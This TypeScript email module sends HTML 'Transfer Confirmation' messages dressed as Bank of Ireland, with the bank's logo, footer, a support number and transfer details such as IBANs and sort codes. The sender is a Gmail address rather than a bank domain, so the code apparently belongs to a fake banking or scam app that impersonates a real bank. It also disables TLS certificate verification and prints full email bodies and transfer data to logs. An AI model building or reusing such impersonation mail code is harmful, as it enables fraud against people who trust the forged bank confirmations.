/**
 * Email service for sending transfer confirmations and notifications
 * Uses the same SMTP configuration as the OTC service
 */
import nodemailer from 'nodemailer';
import fs from 'fs';
import path from 'path';

export interface EmailParams {
  to: string;
  subject: string;
  body: string;
}

export interface TransferConfirmationDetails {
  recipientName: string;
  amount: string;
  currency: string;
  dateTime: string;
  transactionReference: string;
  senderName: string;
  accountInfo?: string;
}

// Create SMTP transporter using the same configuration as OTC service
const createTransporter = () => {
  try {
    const emailConfig = {
      host: process.env.SMTP_HOST,
      port: parseInt(process.env.SMTP_PORT || '587'),
      secure: process.env.SMTP_PORT === '465', // Use secure for port 465
      auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASS
      },
      tls: {
        rejectUnauthorized: false
      }
    };

    // Only initialize if SMTP credentials are provided
    if (emailConfig.host && emailConfig.auth.user && emailConfig.auth.pass) {
      return nodemailer.createTransport(emailConfig);
    }
    return null;
  } catch (error) {
    console.error('Failed to create email transporter:', error);
    return null;
  }
};

/**
 * Send email using the same SMTP configuration as the OTC service
 */
export async function sendEmail(to: string, subject: string, body: string): Promise<boolean> {
  console.log('🔵 EMAIL FUNCTION CALLED - sendEmail()');
  console.log('📧 SENDING EMAIL NOTIFICATION');
  console.log(`To: ${to}`);
  console.log(`Subject: ${subject}`);
  console.log(`Body preview: ${body.substring(0, 100)}...`);
  
  const transporter = createTransporter();
  
  if (!transporter) {
    console.log('SMTP not configured. Email would be sent to:', { to, subject });
    console.log('Email content:');
    console.log(body);
    return false;
  }

  try {
    // Prepare Bank of Ireland logo attachment
    const logoPath = path.join(process.cwd(), 'client', 'public', 'icons', 'boi-icon-192.png');
    let attachments = [];
    
    if (fs.existsSync(logoPath)) {
      attachments.push({
        filename: 'boi-logo.png',
        path: logoPath,
        cid: 'boi-logo' // Content ID for inline embedding
      });
    }

    const mailOptions = {
      from: 'bankofireland2007@gmail.com', // Use the same sender as OTC service
      to: to,
      subject: subject,
      html: `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 0; background-color: #ffffff;">
          <!-- Header with Bank of Ireland Logo -->
          <div style="background-color: #1f5f8b; padding: 20px; text-align: center;">
            ${fs.existsSync(logoPath) ? 
              '<img src="cid:boi-logo" alt="Bank of Ireland" style="height: 60px; width: auto; display: block; margin: 0 auto;">' : 
              '<h2 style="margin: 0; color: white; font-size: 24px;">Bank of Ireland</h2>'
            }
          </div>
          
          <!-- Email Content -->
          <div style="background-color: #ffffff; padding: 30px; line-height: 1.6; color: #333333;">
            <div style="font-size: 16px;">
              ${body.replace(/\n/g, '<br>').replace(/•/g, '&bull;')}
            </div>
          </div>
          
          <!-- Footer -->
          <div style="background-color: #f8f9fa; padding: 20px; text-align: center; border-top: 1px solid #dee2e6;">
            <p style="margin: 0; font-size: 12px; color: #666666;">
              This is an automated message from Bank of Ireland. Please do not reply to this email.
            </p>
          </div>
        </div>
      `,
      text: body,
      attachments: attachments
    };

    await transporter.sendMail(mailOptions);
    console.log(`✅ Transfer confirmation email sent successfully to: ${to}`);
    return true;
  } catch (error) {
    console.error('Failed to send transfer confirmation email:', error);
    console.log('Email content that failed to send:');
    console.log(body);
    return false;
  }
}

/**
 * Generate transfer confirmation email content with Bank of Ireland formatting
 */
export function generateTransferConfirmationEmail(details: TransferConfirmationDetails, transferData?: any): { subject: string; body: string } {
  const subject = "Transfer Confirmation";
  
  // Determine transfer type based on payment method or currency
  const isUKTransfer = transferData?.paymentMethod === 'UK Transfer' || 
                     transferData?.recipientSortCode || 
                     transferData?.recipientAccountNumber;
  
  const isSEPATransfer = transferData?.paymentMethod === 'SEPA Transfer' || 
                        transferData?.iban || 
                        transferData?.bicCode ||
                        details.currency === '€';

  let transferDetails = '';
  
  if (isUKTransfer) {
    transferDetails = `
• Amount: £${details.amount}
• To Account: ${details.recipientName}
• Account Number: ${transferData?.recipientAccountNumber || 'Not available'}
• Sort Code: ${transferData?.recipientSortCode || 'Not available'}
• Reference: ${details.transactionReference}
• Date/Time: ${details.dateTime}
• Transaction ID: ${transferData?.id || 'Not available'}
• Unique Reference: ${details.transactionReference}`;
  } else if (isSEPATransfer) {
    transferDetails = `
• Amount: €${details.amount}
• To Account: ${details.recipientName}
• IBAN: ${transferData?.iban || transferData?.recipientIban || 'Not available'}
• BIC: ${transferData?.bicCode || 'Not available'}
• Reference: ${details.transactionReference}
• Date/Time: ${details.dateTime}
• Transaction ID: ${transferData?.id || 'Not available'}
• Unique Reference: ${details.transactionReference}`;
  } else {
    // Default format for other transfers
    transferDetails = `
• Amount: ${details.currency}${details.amount}
• To Account: ${details.recipientName}
• Reference: ${details.transactionReference}
• Date/Time: ${details.dateTime}
• Transaction ID: ${transferData?.id || 'Not available'}
• Unique Reference: ${details.transactionReference}`;
  }
  
  const body = `Dear ${details.senderName},

We confirm that your recent transfer has been successfully completed.
${transferDetails}

If you did not authorise this payment, please contact us immediately on 1800 123 456 or via your online banking.

Thank you for banking with Bank of Ireland.

BOI Customer Service
www.bankofireland.com`;
  
  return { subject, body };
}

/**
 * Send transfer confirmation email to user
 */
export async function sendTransferConfirmation(
  userEmail: string, 
  details: TransferConfirmationDetails,
  transferData?: any
): Promise<boolean> {
  console.log('🔵 TRANSFER CONFIRMATION EMAIL TRIGGERED - sendTransferConfirmation()');
  console.log('Sending to:', userEmail);
  console.log('Transfer:', details.amount, details.recipientName, details.transactionReference);
  console.log('Transfer data:', transferData);
  
  try {
    const { subject, body } = generateTransferConfirmationEmail(details, transferData);
    const success = await sendEmail(userEmail, subject, body);
    
    if (success) {
      console.log(`✅ Transfer confirmation email sent to ${userEmail} for transaction ${details.transactionReference}`);
    } else {
      console.error(`❌ Failed to send transfer confirmation email to ${userEmail}`);
    }
    
    return success;
  } catch (error) {
    console.error('🔴 ERROR in sendTransferConfirmation:', error);
    return false;
  }
}